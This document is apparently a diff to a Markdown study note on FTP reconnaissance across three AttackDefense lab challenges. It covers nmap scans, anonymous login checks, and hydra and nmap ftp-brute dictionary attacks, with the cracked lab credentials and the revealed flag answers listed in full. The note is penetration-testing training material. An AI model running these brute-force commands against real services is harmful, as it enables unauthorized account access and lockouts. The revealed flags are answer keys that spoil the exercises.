@@ -20,9 +20,7 @@ Here are some key features and aspects of FTP:
 
 (**F**ile **T**ransfer **P**rotocol) - a _client-server_ protocol used to transfer files between a network using TCP/UDP connections.
 
-It requires a command channel and a data channel.
-
-Default FTP port is **`21`**, opened when FTP is activated for sharing data.
+FTP uses a control connection (normally TCP 21) and a separate data connection. Active and passive modes differ in how that data connection is established. Traditional FTP does not encrypt credentials or file contents; FTPS adds TLS to FTP, while SFTP is a separate file-transfer protocol carried over SSH.
 
 ```bash
 sudo nmap -p21 -sV -sC -O <TARGET_IP>
@@ -32,7 +30,7 @@ sudo nmap -p21 -sV -sC -O <TARGET_IP>
 
 #### Lab 1
 
-> 🔬 [ProFTP Recon: Basics](https://attackdefense.com/challengedetails?cid=518)
+>  [ProFTP Recon: Basics](https://attackdefense.com/challengedetails?cid=518)
 >
 > * Target IP: `192.217.238.3`
 > * Enumeration of [ProFTP](http://www.proftpd.org/) server
@@ -59,7 +57,7 @@ nmap -p21 -sV -O 192.217.238.3
 Service Info: OS: Unix
 ```
 
-> 📌 FTP server version is `ProFTPD 1.3.5a`.
+>  FTP server version is `ProFTPD 1.3.5a`.
 
 ### FTP Anonymous Login
 
@@ -72,7 +70,7 @@ ftp 192.217.238.3
 # anonymous login failed
 ```
 
-* Use `hydra` with some users/passwords word lists to check if any credentials work with the ftp server
+* In an explicitly authorized lab, a controlled password-audit tool can test a small approved set of credentials. Avoid broad guessing against production mail or file-transfer services; it can cause account lockouts and service disruption.
 
 ```bash
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.217.238.3 -t 4 ftp
@@ -91,7 +89,7 @@ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr
 1 of 1 target successfully completed, 7 valid passwords found
 ```
 
-> 📌 Found credentials are:
+>  Found credentials are:
 >
 > `sysadmin:654321` `rooty:qwerty` `demo:butterfly` `auditor:chocolate` `anon:purple` `administrator:tweety` `diag:tigger`
 
@@ -127,7 +125,7 @@ root@attackdefense:~# cat secret.txt
 
 <details>
 
-<summary>Reveal Flag - sysadmin flag is: 🚩</summary>
+<summary>Reveal Flag - sysadmin flag is: </summary>
 
 `260ca9dd8a4577fc00b7bd5810298076`
 
@@ -135,7 +133,7 @@ root@attackdefense:~# cat secret.txt
 
 <details>
 
-<summary>Reveal Flag - rooty flag is: 🚩</summary>
+<summary>Reveal Flag - rooty flag is: </summary>
 
 `e529a9cea4a728eb9c5828b13b22844c`
 
@@ -143,7 +141,7 @@ root@attackdefense:~# cat secret.txt
 
 <details>
 
-<summary>Reveal Flag - demo flag is: 🚩</summary>
+<summary>Reveal Flag - demo flag is: </summary>
 
 `d6a6bc0db10694a2d90e3a69648f3a03`
 
@@ -151,7 +149,7 @@ root@attackdefense:~# cat secret.txt
 
 <details>
 
-<summary>Reveal Flag - auditor flag is: 🚩</summary>
+<summary>Reveal Flag - auditor flag is: </summary>
 
 `098f6bcd4621d373cade4e832627b4f6`
 
@@ -159,7 +157,7 @@ root@attackdefense:~# cat secret.txt
 
 <details>
 
-<summary>Reveal Flag - anon flag is: 🚩</summary>
+<summary>Reveal Flag - anon flag is: </summary>
 
 `1bc29b36f623ba82aaf6724fd3b16718`
 
@@ -167,7 +165,7 @@ root@attackdefense:~# cat secret.txt
 
 <details>
 
-<summary>Reveal Flag - administrator flag is: 🚩</summary>
+<summary>Reveal Flag - administrator flag is: </summary>
 
 `21232f297a57a5a743894a0e4a801fc3`
 
@@ -175,7 +173,7 @@ root@attackdefense:~# cat secret.txt
 
 <details>
 
-<summary>Reveal Flag - diag flag is: 🚩</summary>
+<summary>Reveal Flag - diag flag is: </summary>
 
 `12a032ce9179c32a6c7ab397b9d871fa`
 
@@ -185,7 +183,7 @@ root@attackdefense:~# cat secret.txt
 
 #### Lab 2
 
-> 🔬 [VSFTPD Recon: Basics](https://attackdefense.com/challengedetails?cid=519)
+>  [VSFTPD Recon: Basics](https://attackdefense.com/challengedetails?cid=519)
 >
 > * Target IP: `192.119.169.3`
 > * Enumeration of [vsftpd](https://security.appspot.com/vsftpd.html) server
@@ -210,9 +208,9 @@ nmap -p21 -sV -O 192.119.169.3
 21/tcp open  ftp     vsftpd 3.0.3
 ```
 
-> 📌 FTP server version `vsftpd 3.0.3`
+>  FTP server version `vsftpd 3.0.3`
 
-* Use [nmap ftp-anon script](https://nmap.org/nsedoc/scripts/ftp-anon.html) to check `anonymous` user login
+* Use the [Nmap ftp-anon script](https://nmap.org/nsedoc/scripts/ftp-anon.html) to check `anonymous` user login
 
 ```bash
 nmap --script ftp-anon -p21 192.119.169.3
@@ -225,7 +223,7 @@ nmap --script ftp-anon -p21 192.119.169.3
 |_drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
 ```
 
-> 📌 Anonymous FTP login allowed
+>  Anonymous FTP login allowed
 
 ```bash
 ftp 192.119.169.3
@@ -249,7 +247,7 @@ root@attackdefense:~# cat flag
 
 <details>
 
-<summary>Reveal Flag: 🚩</summary>
+<summary>Reveal Flag: </summary>
 
 `4267bdfbff77d7c2635e4572519a8b9c`
 
@@ -259,10 +257,10 @@ root@attackdefense:~# cat flag
 
 #### Lab 3
 
-> 🔬 [VSFTPD Recon: Dictionary Attack](https://attackdefense.com/challengedetails?cid=520)
+>  [VSFTPD Recon: Dictionary Attack](https://attackdefense.com/challengedetails?cid=520)
 >
 > * Target IP: `192.14.30.3`
-> * Dicotionary attack on `vsftpd` server
+> * Dictionary attack on `vsftpd` server
 > * _FTP server terminates the session after 3 attemps_
 
 ```bash
@@ -299,9 +297,9 @@ nmap --script ftp-brute --script-args userdb=/root/users -p21 192.14.30.3
 |_  Statistics: Performed 78 guesses in 55 seconds, average tps: 1.5
 ```
 
-> 📌 _billy_'s password is `carlos`
+>  _billy_'s password is `carlos`
 
-* A custom script to attemp the logins is required if automated dictionary attack do not work, since the server terminates the sessions after 3 login attempts.
+* A custom script to attempt the logins is required if automated dictionary attack do not work, since the server terminates the sessions after 3 login attempts.
 * `e.g.` python script:
 
 ```bash
@@ -358,7 +356,7 @@ root@attackdefense:~# cat flag
 
 <details>
 
-<summary>Reveal Flag: 🚩</summary>
+<summary>Reveal Flag: </summary>
 
 `c07c7a9be16f43bb473ed7b604295c0b`
 
